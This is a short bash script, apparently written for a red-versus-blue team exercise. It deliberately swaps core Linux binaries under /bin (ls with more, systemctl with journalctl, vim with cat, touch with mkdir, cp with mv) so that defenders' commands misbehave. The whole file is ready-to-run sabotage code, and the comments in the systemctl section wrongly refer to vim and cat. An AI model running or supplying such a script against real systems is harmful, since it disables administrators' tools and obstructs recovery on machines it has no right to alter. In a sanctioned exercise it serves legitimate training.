#!/bin/bash
###########################################################
# Author: Alyssa Rios                                     #
# Date: 2/10/2025                                         #
# Team: Red                                               #
# This file batch scrambles some of the Linux binaries    #
# in order to confuse the blue team and disrupt usability #
###########################################################

# Swapping ls and more
mv /bin/ls /bin/ls-tmp # renames ls binary to tmp file
mv /bin/more /bin/ls # renames more binary to ls binary
mv /bin/ls-tmp /bin/more #renames tmp file to more binary

# Swapping systemctl with journalctl
mv /bin/systemctl /bin/systemctl-tmp # renames vim binary to tmp file
mv /bin/journalctl /bin/systemctl # renames cat binary to vim binary
mv /bin/systemctl-tmp /bin/journalctl # renames tmp file to cat binary

# Swapping vim with cat
mv /bin/vim /bin/vim-tmp # renames vim binary to tmp file
mv /bin/cat /bin/vim # renames cat binary to vim binary
mv /bin/vim-tmp /bin/cat # renames tmp file to cat binary

# Swapping touch with mkdir
mv /bin/touch /bin/touch-tmp # renames touch binary to tmp file
mv /bin/mkdir /bin/touch # renames mkdir binary to touch binary
mv /bin/touch-tmp /bin/mkdir # renames tmp file to mkdir binary 

# Swapping cp with mv
# Must be executed last
mv /bin/cp /bin/cp-tmp # renames cp binary tmp file
mv /bin/mv /bin/cp # renames mv binary to cp binary
cp /bin/cp-tmp /bin/mv # renames tmp file to mv binary
